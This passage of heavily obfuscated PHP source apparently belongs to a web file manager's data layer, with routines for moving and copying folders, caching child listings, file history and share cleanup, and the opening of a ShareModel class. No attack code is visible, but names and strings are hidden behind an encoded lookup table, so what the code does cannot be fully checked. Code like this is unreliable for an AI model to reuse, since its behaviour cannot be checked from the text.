array($Ãâ¼Ñ°¼[193] => $İÌ˜€‘å, $Ãâ¼Ñ°¼[97] => $Ãâ¼Ñ°¼[538], $Ãâ¼Ñ°¼[450] => str_replace($Ãâ¼Ñ°¼[53], $Ãâ¼Ñ°¼[12], Pinyin::get($®Ç½Öİã))); $´ğ™òÉ—[$Ãâ¼Ñ°¼[630]][] = array($Ãâ¼Ñ°¼[193] => $İÌ˜€‘å, $Ãâ¼Ñ°¼[97] => $Ãâ¼Ñ°¼[537], $Ãâ¼Ñ°¼[450] => Pinyin::get($®Ç½Öİã, $Ãâ¼Ñ°¼[656])); } $´ğ™òÉ—[$Ãâ¼Ñ°¼[630]][] = array($Ãâ¼Ñ°¼[193] => $İÌ˜€‘å, $Ãâ¼Ñ°¼[97] => $Ãâ¼Ñ°¼[517], $Ãâ¼Ñ°¼[450] => KodSort::makeStr($®Ç½Öİã)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($•‡ŠğÏ€) { $˜®ŞÁÅ =& $_SERVER[Ş­ğŠìÒ]; $³Ù¢¾àä = $this->sourceInfo($•‡ŠğÏ€); $—®û«ßÑ = $˜®ŞÁÅ[657]; $‡åÒ³Õ‘ = array($˜®ŞÁÅ[584] => array($˜®ŞÁÅ[612], $³Ù¢¾àä[$˜®ŞÁÅ[584]] . $•‡ŠğÏ€ . $˜®ŞÁÅ[613]), $˜®ŞÁÅ[505] => $this->targetIsDelete); $Ó¢ƒ¸óö = $this->field($—®û«ßÑ)->where($‡åÒ³Õ‘)->select(); if (!$Ó¢ƒ¸óö) { return; } $Ó¢ƒ¸óö = array_to_keyvalue($Ó¢ƒ¸óö, $˜®ŞÁÅ[193]); foreach ($Ó¢ƒ¸óö as $†•èàº) { $ò£ÙÔÜ· = $†•èàº[$˜®ŞÁÅ[192]]; $•‡ŠğÏ€ = $†•èàº[$˜®ŞÁÅ[193]]; if (!isset($this->_childrenListCache[$•‡ŠğÏ€]) && $†•èàº[$˜®ŞÁÅ[485]] == $˜®ŞÁÅ[91]) { $this->_childrenListCache[$•‡ŠğÏ€] = array(); } if (!isset($this->_childrenListCache[$ò£ÙÔÜ·])) { $this->_childrenListCache[$ò£ÙÔÜ·] = array(); } $this->_childrenListCache[$ò£ÙÔÜ·][$•‡ŠğÏ€] = $†•èàº; $this->_childrenItemCache[$•‡ŠğÏ€] = $†•èàº; } } private function _childrenListAll($šÔÛ¶Ãî, &$”Œœ‰Ë©) { $¶ğÌ©Ñ =& $_SERVER[Ş­ğŠìÒ]; if (!isset($this->_childrenListCache[$šÔÛ¶Ãî])) { return; } $†ÀªØ = $this->_childrenListCache[$šÔÛ¶Ãî]; foreach ($†ÀªØ as $¨Íüšİ‘ => $™©çû€¶) { $”Œœ‰Ë©[$¨Íüšİ‘] = $™©çû€¶; if ($™©çû€¶[$¶ğÌ©Ñ[485]] == $¶ğÌ©Ñ[91]) { $this->_childrenListAll($¨Íüšİ‘, $”Œœ‰Ë©); } } } private function sourceInfoCache($£• öúü) { if (isset($this->_childrenItemCache[$£• öúü])) { return $this->_childrenItemCache[$£• öúü]; } return $this->sourceInfo($£• öúü); } private function _childrenList($™Ï“‘äë) { if (isset($this->_childrenListCache[$™Ï“‘äë])) { return $this->_childrenListCache[$™Ï“‘äë]; } return $this->_childrenListSelect($™Ï“‘äë); } private function _childrenListSelect($ŸÅß•) { $—Ñ•’ã =& $_SERVER[Ş­ğŠìÒ]; $ÓéÊ…ùˆ = array($—Ñ•’ã[192] => $ŸÅß•, $—Ñ•’ã[505] => $this->targetIsDelete); $óß†Åİ = $this->where($ÓéÊ…ùˆ)->select(); $óß†Åİ = $óß†Åİ ? $óß†Åİ : array(); $º“üíè  = array_to_keyvalue($óß†Åİ, $—Ñ•’ã[193]); $this->_childrenListCache[$ŸÅß•] = $º“üíè ; foreach ($º“üíè  as $ŸÅß• => $çÖµ±Å) { $this->_childrenItemCache[$ŸÅß•] = $çÖµ±Å; } return $º“üíè ; } private function fileNameExistAuto($©…£í, $ü‚ŒÁõë) { $¨›‚ÜÔä =& $_SERVER[Ş­ğŠìÒ]; if ($ü‚ŒÁõë[$¨›‚ÜÔä[505]] == $¨›‚ÜÔä[91]) { return $this->fileNameExist($©…£í, $ü‚ŒÁõë[$¨›‚ÜÔä[32]]); } return $this->fileNameExistCache($©…£í, $ü‚ŒÁõë[$¨›‚ÜÔä[32]]); } private function fileNameExistCache($Öê µà, $…Ô¦Ò®‡) { $ ±îË± =& $_SERVER[Ş­ğŠìÒ]; $…Ô¦Ò®‡ = strtolower($…Ô¦Ò®‡); $ã³¯Ëş‰ = $this->_childrenList($Öê µà); foreach ($ã³¯Ëş‰ as $üÆË¥•ë) { if ($…Ô¦Ò®‡ == strtolower($üÆË¥•ë[$ ±îË±[32]])) { return $üÆË¥•ë[$ ±îË±[193]]; } } return !1; } private function fileNameAutoCache($êºõèŸ», $ŞóÏ´—Ø, $â¤€õ”, $²Ê¬®İÚ) { $¥¯ˆÁÉü =& $_SERVER[Ş­ğŠìÒ]; $ûÍ§ »ä = $this->_childrenList($êºõèŸ»); $µ’ëŒÉê = array_to_keyvalue($ûÍ§ »ä, $¥¯ˆÁÉü[12], $¥¯ˆÁÉü[32]); return $this->fileNameAutoGet($µ’ëŒÉê, $ŞóÏ´—Ø, $â¤€õ”, $²Ê¬®İÚ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ÈúíÉÑ, $ğ¯Òƒîë, $¿¨á†„¼ = REPEAT_REPLACE, $š˜àšßè = '') { $†ÈûÍÔ =& $_SERVER[Ş­ğŠìÒ]; $¢Íæ¸Ô‰ = $this->sourceInfo($ÈúíÉÑ); $Ñ±àÁµò = $this->sourceInfo($ğ¯Òƒîë); if ($¢Íæ¸Ô‰[$†ÈûÍÔ[192]] == $Ñ±àÁµò[$†ÈûÍÔ[193]]) { if ($¢Íæ¸Ô‰[$†ÈûÍÔ[505]] == $†ÈûÍÔ[91]) { Model($†ÈûÍÔ[503])->restore(array($ÈúíÉÑ)); } if (!$š˜àšßè || $š˜àšßè == $¢Íæ¸Ô‰[$†ÈûÍÔ[32]]) { return $ÈúíÉÑ; } } $§¼äç±ö = $this->pathInfoMore($ÈúíÉÑ); if ($this->isParentOf($ÈúíÉÑ, $ğ¯Òƒîë)) { return !1; } if (!$¢Íæ¸Ô‰ || !$Ñ±àÁµò || $Ñ±àÁµò[$†ÈûÍÔ[485]] != $†ÈûÍÔ[91]) { return !1; } Hook::trigger($†ÈûÍÔ[658], $§¼äç±ö); $this->targetIsDelete = intval($¢Íæ¸Ô‰[$†ÈûÍÔ[505]]); if ($¢Íæ¸Ô‰[$†ÈûÍÔ[192]] == $ğ¯Òƒîë && $š˜àšßè != $¢Íæ¸Ô‰[$†ÈûÍÔ[32]]) { $‹ûİÇš = $this->fileNameExist($ğ¯Òƒîë, $š˜àšßè); if ($‹ûİÇš && $¢Íæ¸Ô‰[$†ÈûÍÔ[485]] == $†ÈûÍÔ[228]) { $™Ñğ¿º¾ = $this->sourceInfo($‹ûİÇš); $úáï³úá = $this->fileHistory($™Ñğ¿º¾, $¢Íæ¸Ô‰[$†ÈûÍÔ[541]], $¢Íæ¸Ô‰[$†ÈûÍÔ[79]]); if (!$úáï³úá) { Model($†ÈûÍÔ[544])->remove($¢Íæ¸Ô‰[$†ÈûÍÔ[541]]); } $this->removeNow($ÈúíÉÑ, !1); $this->folderSizeReset($ğ¯Òƒîë); Hook::trigger($†ÈûÍÔ[659], $§¼äç±ö); return $‹ûİÇš; } } $±ôú˜ƒ = $š˜àšßè ? $š˜àšßè : $¢Íæ¸Ô‰[$†ÈûÍÔ[32]]; $this->lockMoveStart($ÈúíÉÑ); $this->lockWriteStart($ğ¯Òƒîë, $±ôú˜ƒ); $ÛÉìªí¿ = array($†ÈûÍÔ[629] => array(), $†ÈûÍÔ[660] => !1); $this->clearShare($ÈúíÉÑ, $ğ¯Òƒîë); $“¨ªÔÇ© = $this->fileNameExistAuto($ğ¯Òƒîë, $¢Íæ¸Ô‰); $©´¨ñ®É = $this->_move($ÈúíÉÑ, $ğ¯Òƒîë, $¿¨á†„¼, $ÛÉìªí¿, $š˜àšßè); $this->sourceCacheClear(); if ($¢Íæ¸Ô‰[$†ÈûÍÔ[485]] == $†ÈûÍÔ[91] && $“¨ªÔÇ©) { $this->folderSizeResetChildren($©´¨ñ®É); } Model($†ÈûÍÔ[230])->linkAdd($ÛÉìªí¿[$†ÈûÍÔ[629]]); if ($“¨ªÔÇ© && $ÛÉìªí¿[$†ÈûÍÔ[660]]) { $this->removeNow($ÈúíÉÑ, !1); } $this->lockMoveEnd($ÈúíÉÑ); $this->lockWriteEnd($ğ¯Òƒîë, $±ôú˜ƒ); $this->folderSizeReset($¢Íæ¸Ô‰[$†ÈûÍÔ[192]]); $this->folderSizeReset($ğ¯Òƒîë); $¿›Ü»ı = array($¢Íæ¸Ô‰[$†ÈûÍÔ[192]], $ğ¯Òƒîë); if ($¢Íæ¸Ô‰[$†ÈûÍÔ[485]] == $†ÈûÍÔ[91]) { $¿›Ü»ı[] = $ÈúíÉÑ; } $this->updateModifyTime($¿›Ü»ı); Model($†ÈûÍÔ[633])->eventMove($ÈúíÉÑ, $¢Íæ¸Ô‰[$†ÈûÍÔ[192]], $ğ¯Òƒîë); Hook::trigger($†ÈûÍÔ[659], $§¼äç±ö); return $©´¨ñ®É; } private function _move($ÈÈÏ™Â, $µóÄà÷¸, $¤¹€¤¼, &$ï›«İ¹÷, $ôûèµÔü = '') { $İ¢Ş§”Ì =& $_SERVER[Ş­ğŠìÒ]; $â¿‹ÀİÇ = $this->sourceInfo($ÈÈÏ™Â); $´“é‹‰Í = $â¿‹ÀİÇ[$İ¢Ş§”Ì[485]] == $İ¢Ş§”Ì[91]; $ä‘­²å² = $ôûèµÔü ? $ôûèµÔü : $â¿‹ÀİÇ[$İ¢Ş§”Ì[32]]; $İ¡Ê³Œ— = $this->fileNameExistAuto($µóÄà÷¸, $â¿‹ÀİÇ); $this->lockMoveStart($ÈÈÏ™Â); $this->lockWriteStart($µóÄà÷¸, $ä‘­²å²); if (!$İ¡Ê³Œ—) { return $this->_moveForce($ÈÈÏ™Â, $µóÄà÷¸, $ä‘­²å²); } $½îª¬ˆ² = $İ¡Ê³Œ—; $©ÖÂ’á­ = !1; if ($´“é‹‰Í) { if ($¤¹€¤¼ == REPEAT_RENAME_FOLDER) { $ä‘­²å² = $this->fileNameAuto($µóÄà÷¸, $ä‘­²å², $¤¹€¤¼, $´“é‹‰Í); $½îª¬ˆ² = $this->_moveForce($ÈÈÏ™Â, $µóÄà÷¸, $ä‘­²å²); } else { if ($¤¹€¤¼ == REPEAT_RENAME_FOLDER) { $¤¹€¤¼ = REPEAT_RENAME; } $û¶ïõÔÛ = $this->_childrenListSelect($ÈÈÏ™Â); foreach ($û¶ïõÔÛ as $°§€Î›å) { $this->_move($°§€Î›å[$İ¢Ş§”Ì[193]], $İ¡Ê³Œ—, $¤¹€¤¼, $ï›«İ¹÷); } $©ÖÂ’á­ = !0; } } else { if ($¤¹€¤¼ == REPEAT_SKIP) { $©ÖÂ’á­ = !0; } else { if ($¤¹€¤¼ == REPEAT_RENAME || $¤¹€¤¼ == REPEAT_RENAME_FOLDER) { $ä‘­²å² = $this->fileNameAuto($µóÄà÷¸, $ä‘­²å², $¤¹€¤¼, $´“é‹‰Í); $½îª¬ˆ² = $this->_moveForce($ÈÈÏ™Â, $µóÄà÷¸, $ä‘­²å²); } else { if ($¤¹€¤¼ == REPEAT_REPLACE) { $å¡Üç¸³ = $this->sourceInfoCache($İ¡Ê³Œ—); $š×ğ«Â» = $this->fileHistory($å¡Üç¸³, $â¿‹ÀİÇ[$İ¢Ş§”Ì[541]], $â¿‹ÀİÇ[$İ¢Ş§”Ì[79]]); $©ÖÂ’á­ = !0; if ($š×ğ«Â») { $ï›«İ¹÷[$İ¢Ş§”Ì[629]][] = $â¿‹ÀİÇ[$İ¢Ş§”Ì[541]]; } } } } } if ($©ÖÂ’á­ && !$ï›«İ¹÷[$İ¢Ş§”Ì[660]]) { $ï›«İ¹÷[$İ¢Ş§”Ì[660]] = !0; } return $½îª¬ˆ²; } private function _moveForce($·÷ºãÉ¾, $€ı…Œ€µ, $øÏÇüŞÎ) { $†÷¦ëøÁ =& $_SERVER[Ş­ğŠìÒ]; $úÀ½×˜™ = $this->sourceInfo($·÷ºãÉ¾); $›²á’û = $this->sourceInfo($€ı…Œ€µ); $å¾Ğ­Ë = $úÀ½×˜™[$†÷¦ëøÁ[485]] == $†÷¦ëøÁ[91]; $ë°¯½à¦ = array($†÷¦ëøÁ[477] => $›²á’û[$†÷¦ëøÁ[193]], $†÷¦ëøÁ[652] => $›²á’û[$†÷¦ëøÁ[584]] . $›²á’û[$†÷¦ëøÁ[193]] . $†÷¦ëøÁ[50], $†÷¦ëøÁ[648] => $›²á’û[$†÷¦ëøÁ[190]], $†÷¦ëøÁ[649] => $›²á’û[$†÷¦ëøÁ[569]], $†÷¦ëøÁ[651] => USER_ID, $†÷¦ëøÁ[494] => $øÏÇüŞÎ); $”ùç™š  = $úÀ½×˜™[$†÷¦ëøÁ[190]] == SourceModel::TYPE_GROUP && $›²á’û[$†÷¦ëøÁ[190]] == SourceModel::TYPE_GROUP && $úÀ½×˜™[$†÷¦ëøÁ[569]] == $›²á’û[$†÷¦ëøÁ[569]]; if (!$”ùç™š  && $this->moveClearAuth) { Model($†÷¦ëøÁ[567])->authClear($·÷ºãÉ¾); } $‡»¨ìÁ™ = $úÀ½×˜™[$†÷¦ëøÁ[505]] == $†÷¦ëøÁ[91] && $›²á’û[$†÷¦ëøÁ[505]] != $†÷¦ëøÁ[91]; if ($‡»¨ìÁ™) { $ë°¯½à¦[$†÷¦ëøÁ[504]] = 0; } if ($å¾Ğ­Ë) { $¡Şø§şé = array($†÷¦ëøÁ[652] => array($†÷¦ëøÁ[612], $úÀ½×˜™[$†÷¦ëøÁ[584]] . $úÀ½×˜™[$†÷¦ëøÁ[193]] . $†÷¦ëøÁ[613])); $ø†ÃÏİ¨ = $úÀ½×˜™[$†÷¦ëøÁ[584]] . $úÀ½×˜™[$†÷¦ëøÁ[193]] . $†÷¦ëøÁ[50]; $ù‚İÒ”¬ = $›²á’û[$†÷¦ëøÁ[584]] . $›²á’û[$†÷¦ëøÁ[193]] . $†÷¦ëøÁ[50] . $úÀ½×˜™[$†÷¦ëøÁ[193]] . $†÷¦ëøÁ[50]; $ƒ›éÍñ = array($†÷¦ëøÁ[652] => array($†÷¦ëøÁ[661], "\x72\x65\160\x6c\x61\x63\145\50\160\141\x72\145\x6e\164\114\145\x76\145\x6c\54\47{$ø†ÃÏİ¨}\47\54\x27{$ù‚İÒ”¬}\x27\51"), $†÷¦ëøÁ[648] => $›²á’û[$†÷¦ëøÁ[190]], $†÷¦ëøÁ[649] => $›²á’û[$†÷¦ëøÁ[569]]); if ($‡»¨ìÁ™) { $ƒ›éÍñ[$†÷¦ëøÁ[504]] = 0; } $this->where($¡Şø§şé)->data($ƒ›éÍñ)->save(); } $this->where(array($†÷¦ëøÁ[491] => $·÷ºãÉ¾))->data($ë°¯½à¦)->save(); return $·÷ºãÉ¾; } private function clearShare($æÄ¹Ğ…, $¾Ä‡ø¡) { $Áò€ÄÆÈ =& $_SERVER[Ş­ğŠìÒ]; $×õ£†°º = $this->sourceInfo($æÄ¹Ğ…); $¦Ïå¯şö = $this->sourceInfo($¾Ä‡ø¡); if ($×õ£†°º[$Áò€ÄÆÈ[569]] == $¦Ïå¯şö[$Áò€ÄÆÈ[569]] && $×õ£†°º[$Áò€ÄÆÈ[190]] == $Áò€ÄÆÈ[662]) { return; } $©ˆ±„Î = array($Áò€ÄÆÈ[584] => array($Áò€ÄÆÈ[612], $×õ£†°º[$Áò€ÄÆÈ[584]] . $æÄ¹Ğ… . $Áò€ÄÆÈ[613])); $­ø÷¾× = $this->field($Áò€ÄÆÈ[491])->where($©ˆ±„Î)->getField($Áò€ÄÆÈ[193], !0); if (!$­ø÷¾×) { return; } $©ˆ±„Î = array($Áò€ÄÆÈ[193] => array($Áò€ÄÆÈ[7], $­ø÷¾×), $Áò€ÄÆÈ[663] => 1); $´†½°™é = Model($Áò€ÄÆÈ[664])->field($Áò€ÄÆÈ[665])->where($©ˆ±„Î)->select(); if (!$´†½°™é) { return; } $´†½°™é = array_to_keyvalue($´†½°™é, $Áò€ÄÆÈ[12], $Áò€ÄÆÈ[665]); $©ˆ±„Î = array($Áò€ÄÆÈ[665] => array($Áò€ÄÆÈ[7], $´†½°™é)); Model($Áò€ÄÆÈ[664])->where($©ˆ±„Î)->save(array($Áò€ÄÆÈ[663] => 0)); Model($Áò€ÄÆÈ[666])->where($©ˆ±„Î)->delete(); } public function copyFolderFromIO($§„´À˜, $Ë¿ äşå, $§öüù£œ, $æ©åÃ, $ŠØæ«Ñ, $­Œ¦¦– = false) { $ØÕã¥¹– =& $_SERVER[Ş­ğŠìÒ]; $ÏÅ¹––æ = array($ØÕã¥¹–[630] => array(), $ØÕã¥¹–[631] => array(), $ØÕã¥¹–[629] => array(), $ØÕã¥¹–[667] => array()); $‘†±òÉ = $­Œ¦¦– ? $­Œ¦¦– : $§„´À˜->pathThis($Ë¿ äşå); $²Õä = $this->fileNameExist($§öüù£œ, $‘†±òÉ); $¯§ˆç²÷ = $this->mkdir($§öüù£œ, $‘†±òÉ, $æ©åÃ); if (!$²Õä || $æ©åÃ == REPEAT_RENAME_FOLDER) { $æ©åÃ = !1; } if ($²Õä) { $this->_childrenAllMake($²Õä); } Hook::trigger($ØÕã¥¹–[668]); $this->_copyChildTo($§„´À˜, $Ë¿ äşå, $¯§ˆç²÷, $æ©åÃ, $ÏÅ¹––æ, $ŠØæ«Ñ); Hook::trigger($ØÕã¥¹–[669]); if ($¯§ˆç²÷) { $this->folderSizeResetChildren($¯§ˆç²÷); } $this->_childrenListClear(); Model($ØÕã¥¹–[632])->addAll($ÏÅ¹––æ[$ØÕã¥¹–[630]], array(), !0); Model($ØÕã¥¹–[633])->eventCopy($¯§ˆç²÷); $this->saveAll($ÏÅ¹––æ[$ØÕã¥¹–[631]]); Model($ØÕã¥¹–[544])->linkAdd($ÏÅ¹––æ[$ØÕã¥¹–[629]]); Model($ØÕã¥¹–[544])->remove($ÏÅ¹––æ[$ØÕã¥¹–[667]]); $this->folderSizeReset($§öüù£œ); $this->updateModifyTime($§öüù£œ); return $¯§ˆç²÷; } private function _copyChildTo($ÅÖ¢Ç£ù, $ÚÑš¤¯ò, $Û´©¬ù, $Ÿ©µ”³ß, &$ÌÈ¶•Ù, $úí¹ûÛØ) { $«Ã¼ÎØÃ =& $_SERVER[Ş­ğŠìÒ]; $ƒ„ÕÔÛñ = $this->sourceInfoCache($Û´©¬ù); $¸¬ËÙ± = $ÅÖ¢Ç£ù->listPath($ÚÑš¤¯ò); $¸¬ËÙ± = $¸¬ËÙ± ? $¸¬ËÙ± : array($«Ã¼ÎØÃ[86] => array(), $«Ã¼ÎØÃ[85] => array()); $ïœÆ ¸Å = array_merge($¸¬ËÙ±[$«Ã¼ÎØÃ[86]], $¸¬ËÙ±[$«Ã¼ÎØÃ[85]]); $â†Øï¸ê = $this->_addFiles($ÅÖ¢Ç£ù, $¸¬ËÙ±[$«Ã¼ÎØÃ[86]], $úí¹ûÛØ); $Ş€·…Ò¡ = array(); foreach ($ïœÆ ¸Å as &$—ŞçÀÉœ) { if (isset($â†Øï¸ê[$—ŞçÀÉœ[$«Ã¼ÎØÃ[32]]])) { $—ŞçÀÉœ = $â†Øï¸ê[$—ŞçÀÉœ[$«Ã¼ÎØÃ[32]]]; } $—ŞçÀÉœ[$«Ã¼ÎØÃ[485]] = $—ŞçÀÉœ[$«Ã¼ÎØÃ[33]] == $«Ã¼ÎØÃ[78]; $—ŞçÀÉœ[$«Ã¼ÎØÃ[486]] = substr(_get($—ŞçÀÉœ, $«Ã¼ÎØÃ[169], $«Ã¼ÎØÃ[12]), 0, 10); $—ŞçÀÉœ[$«Ã¼ÎØÃ[79]] = _get($—ŞçÀÉœ, $«Ã¼ÎØÃ[79], 0); $—ŞçÀÉœ[$«Ã¼ÎØÃ[541]] = _get($—ŞçÀÉœ, $«Ã¼ÎØÃ[541], 0); if (!isset($—ŞçÀÉœ[$«Ã¼ÎØÃ[670]]) && $—ŞçÀÉœ[$«Ã¼ÎØÃ[541]]) { $ÌÈ¶•Ù[$«Ã¼ÎØÃ[667]][] = $—ŞçÀÉœ[$«Ã¼ÎØÃ[541]]; } if ($Ÿ©µ”³ß) { $ÀÜ¾ã¦ˆ = $this->fileNameExistCache($Û´©¬ù, $—ŞçÀÉœ[$«Ã¼ÎØÃ[32]]); if ($ÀÜ¾ã¦ˆ) { if ($—ŞçÀÉœ[$«Ã¼ÎØÃ[485]] || $Ÿ©µ”³ß == REPEAT_SKIP) { continue; } if ($Ÿ©µ”³ß == REPEAT_REPLACE) { $ıªÀ¹ŒÃ = $this->sourceInfoCache($ÀÜ¾ã¦ˆ); $³Ÿ–Òï‹ = $this->fileHistory($ıªÀ¹ŒÃ, $—ŞçÀÉœ[$«Ã¼ÎØÃ[541]], $—ŞçÀÉœ[$«Ã¼ÎØÃ[79]]); if ($³Ÿ–Òï‹) { $ÌÈ¶•Ù[$«Ã¼ÎØÃ[629]][] = $—ŞçÀÉœ[$«Ã¼ÎØÃ[541]]; } continue; } else { if ($Ÿ©µ”³ß == REPEAT_RENAME) { $—ŞçÀÉœ[$«Ã¼ÎØÃ[32]] = $this->fileNameAutoCache($Û´©¬ù, $—ŞçÀÉœ[$«Ã¼ÎØÃ[32]], $Ÿ©µ”³ß, !1); } } } } if (!$—ŞçÀÉœ[$«Ã¼ÎØÃ[485]] && $—ŞçÀÉœ[$«Ã¼ÎØÃ[541]] == 0) { continue; } if (!$—ŞçÀÉœ[$«Ã¼ÎØÃ[485]] && $—ŞçÀÉœ[$«Ã¼ÎØÃ[541]]) { $ÌÈ¶•Ù[$«Ã¼ÎØÃ[629]][] = $—ŞçÀÉœ[$«Ã¼ÎØÃ[541]]; } $Ş€·…Ò¡[] = $this->_makeItemData($—ŞçÀÉœ, $ƒ„ÕÔÛñ, $—ŞçÀÉœ[$«Ã¼ÎØÃ[32]]); } unset($—ŞçÀÉœ); if (!empty($Ş€·…Ò¡)) { $this->addAll($Ş€·…Ò¡); $this->_childrenListSelect($Û´©¬ù); } $ºö‡áÌˆ = $this->_childrenList($Û´©¬ù); $ºö‡áÌˆ = array_to_keyvalue($ºö‡áÌˆ, $«Ã¼ÎØÃ[32]); foreach ($ïœÆ ¸Å as $—ŞçÀÉœ) { $ıªÀ¹ŒÃ = $ºö‡áÌˆ[$—ŞçÀÉœ[$«Ã¼ÎØÃ[32]]]; $ÓÊÀˆªÊ = $ıªÀ¹ŒÃ[$«Ã¼ÎØÃ[193]]; $this->_copyApplyMeta($ıªÀ¹ŒÃ, $ÌÈ¶•Ù); if ($—ŞçÀÉœ[$«Ã¼ÎØÃ[33]] == $«Ã¼ÎØÃ[78]) { $—ŞçÀÉœ[$«Ã¼ÎØÃ[87]] = $ÅÖ¢Ç£ù->getPathInner($—ŞçÀÉœ[$«Ã¼ÎØÃ[87]]); $this->_copyChildTo($ÅÖ¢Ç£ù, $—ŞçÀÉœ[$«Ã¼ÎØÃ[87]], $ÓÊÀˆªÊ, $Ÿ©µ”³ß, $ÌÈ¶•Ù, $úí¹ûÛØ); } } } private function _addFiles($²ÉÔ¨´, $Øöß¤é, $‹ËÂ¦¹) { $¿ï ›‰´ =& $_SERVER[Ş­ğŠìÒ]; if (!$Øöß¤é || count($Øöß¤é) == 0) { return array(); } $ŸÛ·§ú = array(); foreach ($Øöß¤é as &$ŒüåñòÓ) { Hook::trigger($¿ï ›‰´[671], $ŒüåñòÓ); $ŒüåñòÓ[$¿ï ›‰´[87]] = $²ÉÔ¨´->getPathInner($ŒüåñòÓ[$¿ï ›‰´[87]]); $˜É‚È®® = $²ÉÔ¨´->hashSimple($ŒüåñòÓ[$¿ï ›‰´[87]]); $Ê·¦…Øî = $²ÉÔ¨´->hashMd5($ŒüåñòÓ[$¿ï ›‰´[87]]); if (strlen($Ê·¦…Øî) > 10 && !isset($ŸÛ·§ú[$Ê·¦…Øî])) { $ŸÛ·§ú[$Ê·¦…Øî] = array(); } $ŒüåñòÓ[$¿ï ›‰´[672]] = $˜É‚È®®; $ŒüåñòÓ[$¿ï ›‰´[547]] = $Ê·¦…Øî; $ŸÛ·§ú[$Ê·¦…Øî][] =& $ŒüåñòÓ; if (count($ŸÛ·§ú[$Ê·¦…Øî]) > 1) { $ŒüåñòÓ[$¿ï ›‰´[670]] = !0; } Hook::trigger($¿ï ›‰´[673], $ŒüåñòÓ); } unset($ŒüåñòÓ); $Ìğë¼¶ = array($¿ï ›‰´[547] => array($¿ï ›‰´[7], array_keys($ŸÛ·§ú))); $“òœÜÆÆ = Model($¿ï ›‰´[674]); $¾åÈ —¡ = $“òœÜÆÆ->where($Ìğë¼¶)->select(); $¾åÈ —¡ = $¾åÈ —¡ ? $¾åÈ —¡ : array(); foreach ($¾åÈ —¡ as $Íü‚±¯Ğ) { if (!isset($ŸÛ·§ú[$Íü‚±¯Ğ[$¿ï ›‰´[547]]])) { continue; } $’±ŠÏ™— = $ŸÛ·§ú[$Íü‚±¯Ğ[$¿ï ›‰´[547]]]; foreach ($’±ŠÏ™— as &$ŒüåñòÓ) { $ŒüåñòÓ[$¿ï ›‰´[541]] = $Íü‚±¯Ğ[$¿ï ›‰´[541]]; $ŒüåñòÓ[$¿ï ›‰´[670]] = !0; } unset($ŒüåñòÓ); } $Óì±‡Íğ = array(); foreach ($Øöß¤é as $‚Æ®ëÁê) { Hook::trigger($¿ï ›‰´[675], $‚Æ®ëÁê); if (isset($‚Æ®ëÁê[$¿ï ›‰´[670]]) && $‚Æ®ëÁê[$¿ï ›‰´[670]]) { Hook::trigger($¿ï ›‰´[676], $‚Æ®ëÁê); continue; } $¾Çñ¡Ñ£ = $²ÉÔ¨´->getPathInner($‚Æ®ëÁê[$¿ï ›‰´[87]]); $¿Îñ×åø = $“òœÜÆÆ->addFileMake($¾Çñ¡Ñ£, $‚Æ®ëÁê[$¿ï ›‰´[79]], $‚Æ®ëÁê[$¿ï ›‰´[672]], $‚Æ®ëÁê[$¿ï ›‰´[547]], $‚Æ®ëÁê[$¿ï ›‰´[32]], $‹ËÂ¦¹); Hook::trigger($¿ï ›‰´[676], $‚Æ®ëÁê); if (!is_array($¿Îñ×åø)) { continue; } $Óì±‡Íğ[] = $¿Îñ×åø; } $“òœÜÆÆ->addAll($Óì±‡Íğ); $Ìğë¼¶ = array($¿ï ›‰´[547] => array($¿ï ›‰´[7], array_keys($ŸÛ·§ú))); $¾åÈ —¡ = $“òœÜÆÆ->where($Ìğë¼¶)->select(); $¾åÈ —¡ = $¾åÈ —¡ ? $¾åÈ —¡ : array(); foreach ($¾åÈ —¡ as $Íü‚±¯Ğ) { if (!isset($ŸÛ·§ú[$Íü‚±¯Ğ[$¿ï ›‰´[547]]])) { continue; } $€Ö´ğ¹ì =& $ŸÛ·§ú[$Íü‚±¯Ğ[$¿ï ›‰´[547]]]; foreach ($€Ö´ğ¹ì as &$ŒüåñòÓ) { $ŒüåñòÓ[$¿ï ›‰´[541]] = $Íü‚±¯Ğ[$¿ï ›‰´[541]]; } unset($ŒüåñòÓ); } $—­ãÁ£Ä = array(); foreach ($Øöß¤é as $ƒñÂÀ‰Ô) { $—­ãÁ£Ä[$ƒñÂÀ‰Ô[$¿ï ›‰´[32]]] = $ƒñÂÀ‰Ô; } return $—­ãÁ£Ä; } } define($_SERVER[Ş­ğŠìÒ][677], $_SERVER[Ş­ğŠìÒ][678]); $npzmyqjshe = $_SERVER[Ş­ğŠìÒ][679]; goto d™‚ßÖ†ˆ§; C†Œø¨”Ú: class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\145"; protected $dataAuto = array(array("\155\x6f\x64\151\146\x79\x54\x69\155\145", "\x74\151\155\145", "\151\x6e\x73\145\x72\164\54\165\x70\x64\x61\164\145", "\x66\x75\x6e\x63\x74\151\157\x6e"), array("\143\x72\x65\141\164\x65\x54\151\x6d\145", "\x74\151\155\145", "\151\x6e\163\145\162\x74", "\x66\x75\156\143\x74\x69\157\156"), array("\157\160\x74\151\x6f\156\163", '', "\x69\x6e\163\145\162\x74\x2c\165\160\x64\141\164\x65\54\163\x65\154\145\x63\164", "\x6a\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($¦õª”) { $¬˜³ÍòÛ =& $_SERVER[Ş­ğŠìÒ]; $¨•É¥È = isset($¦õª”[0]) ? $¦õª”[0] : !1; return array($¬˜³ÍòÛ[2107] => array(USER_ID, $¬˜³ÍòÛ[2108]), $¬˜³ÍòÛ[2048] => array($¨•É¥È, $¬˜³ÍòÛ[2109])); } protected function listSimple() { $è‹ÀÚÖ = array($_SERVER[Ş­ğŠìÒ][1764] => USER_ID); $¥®·«Â = $this->field($this->fieldList)->where($è‹ÀÚÖ)->select(); return $¥®·«Â ? $¥®·«Â : array(); } protected function getInfo($ôæ±¼€Å, $¢ŒÏµ´Å = false) { $—†öˆˆá =& $_SERVER[Ş­ğŠìÒ]; if ($¢ŒÏµ´Å) { return $this->_getShareInfo(array($—†öˆˆá[665] => $ôæ±¼€Å)); } $Ï»ŸûĞ = $this->cacheFunctionGet($—†öˆˆá[2050], $ôæ±¼€Å); return $Ï»ŸûĞ; } public function getInfoByHash($Œüãœº) { return $this->_getShareInfo(array($_SERVER[Ş­ğŠìÒ][2110] => $Œüãœº)); } public function 